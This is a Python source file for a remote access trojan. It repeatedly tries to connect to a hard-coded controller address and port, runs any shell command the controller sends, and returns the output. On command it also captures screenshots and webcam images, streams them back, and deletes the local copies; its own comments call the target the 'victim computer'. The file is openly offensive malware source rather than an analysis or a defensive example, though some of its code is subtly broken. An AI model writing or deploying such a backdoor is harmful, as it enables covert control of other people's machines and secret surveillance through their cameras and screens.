#!/bin/python

import socket
import pyscreenshot as ImageGrab
import subprocess
import os
import cv2

def connect():
	global host,port,s

	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	host = "192.168.0.12"
	port = 9999
	connected = False

	while not connected:
		try:
			s.connect((host,port))
			connected = True
		except Exception as e:
			pass


def listen():
	while True:

		#We decrypt the command we received
		data = s.recv(1024).decode()

		#We adapt to the command we received
		if str(data) == "screenshot":
			screenshot()
		elif str(data) == "webcam":
			webcam()
		elif str(data) == "q":
			break
		else:

			if data == "ls":
				data = "dir"
			elif data == "ifconfig":
				data = "ipconfig"

			#We open a cmd shell on the target computer and execute the command
			cmd = subprocess.Popen(data, shell=True, stdin=subprocess.PIPE,stdout=subprocess.PIPE,stderr=subprocess.PIPE)

			result = cmd.stdout.read()
			error = cmd.stderr.read()

			#We send out the result
			s.send(result.encode())
			#We send the error if something went wrong
			s.send(error.encode())

			"""
			We send errors if needed
			cmd_byte = cmd.stderr.read() + cmd.stdout.read()
			cmdstr = str(cmd_byte)
			s.send(cmdstr.encode())
			"""


def close():
	s.close()

def screenshot():

	#We take the screenshot with pyinstaller module
	im = ImageGrab.grab(childprocess=False)
	#We save it to the vitctim computer
	im.save("screenshot.png")

	msg = "captured"
	s.send(msg.encode())

	#We open the file and send the img piece by piece
	f = open("screenshot.png", "rb")
	i = f.read(1024)
	#When there is nothing to send we stop
	while i != "":
		s.send(i)
		i = f.read(1024)

	f.close()
	
	msg = "complete"
	s.send(msg.encode())

	# We remove the file from the victim computer
	os.remove("screenshot.png")



def webcam():

	# We create a videocapture object
	c = cv2.VideoCapture(0)

	# We capture the img frame by frame (so here it's the 1st frame)
	# If we want a video we will need to capture theses frames and creates a video
	return_value, image = c.read()

	# And we save it to the target computer
	cv2.imwrite("camera.png", image)
	
	#Delete the variable
	del(c)

	msg = "webcamed"
	s.send(msg.encode())

	#We open the img and send it piece by piece
	f = open("camera.png", "rb")
	i = f.read(1024)
	#When the img is totally sent we stop
	while i != "":
		s.send(i)
		i = f.read()

	f.close()
	msg = "complete"
	s.send(msg.encode())

	# We remove the img from the target computer 
	os.remove("camera.png")

def main():
	connect()
	listen()
	connect()

main()